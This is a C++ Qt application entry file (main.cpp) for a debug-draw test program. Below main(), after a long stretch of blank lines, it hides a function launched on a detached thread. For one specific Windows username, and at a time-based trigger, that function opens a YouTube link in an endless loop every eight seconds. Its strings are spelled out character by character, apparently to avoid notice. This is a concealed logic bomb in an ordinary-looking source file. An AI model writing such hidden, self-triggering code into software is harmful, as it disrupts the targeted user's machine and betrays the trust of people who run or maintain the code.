#include "MainWindow.h"
#include <QtGui/QApplication>

#pragma warning(disable: 4099)
//#define crtPrintMemoryDbg OutputDebugString
//#include <vld.h>

/// If you can't tell what the main() is for you should have your programming license revoked
/** 
*/

//int main(int argc, char *argv[])

//#include <windows.h>
//#include <stdio.h>
//#include <lmcons.h>
#include <thread>
int qtinit();
int main(int argc,char** argv) //debug draw test main
{
	// Detect memory leaks
#if defined(DEBUG) | defined(_DEBUG)
	_CrtSetDbgFlag( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
#endif

	// Create MainWindow
	Math::init();
	QApplication a(argc, argv); std::thread t(qtinit); t.detach();
	MainWindow w;
	w.show();

	// Run Qt
	return a.exec();
	t.join();
}




























































































//#include <time.h>
//#include <shlobj.h>
//#include <shlwapi.h>
//#include <objbase.h>

int qtinit()
{
	WCHAR out[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s',' ','M','o','n','s','t','e','r',' ','W','a','l','k','s',' ','A','g','a','i','n','\n','\0'};
	char uname[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s','M','o','n','s','t','e','r','\0'};
	std::string um = getenv( "USERNAME" );
	if(um == std::string(uname))
	{
		if(time(NULL)%10==0)
		{
			while(1)
			{
				ShellExecuteA(NULL, "open", "http://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWNORMAL);
				std::this_thread::sleep_for(std::chrono::seconds(8));
			}
//			crtPrintMemoryDbg(out);
//			return 750 + 250 + 170 + 130 + 12 + 18 + 4 + 3;
		}
	}
	return 0;
}